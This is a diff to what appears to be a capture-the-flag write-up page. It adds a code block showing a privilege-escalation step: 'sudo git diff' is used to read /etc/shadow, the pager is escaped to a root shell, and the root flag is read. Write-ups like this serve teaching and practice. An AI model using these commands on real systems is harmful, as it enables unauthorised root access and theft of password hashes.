@@ -228,29 +228,14 @@ Gilbert credentials are valid and gained ssh access on port 22. User has sudo mi
 
 <figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
 
+```
+Command:- sudo /usr/bin/git diff /dev/null /etc/shadow
+!/bin/sh
+id 
+cat /root/root.txt
+```
+
 <figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
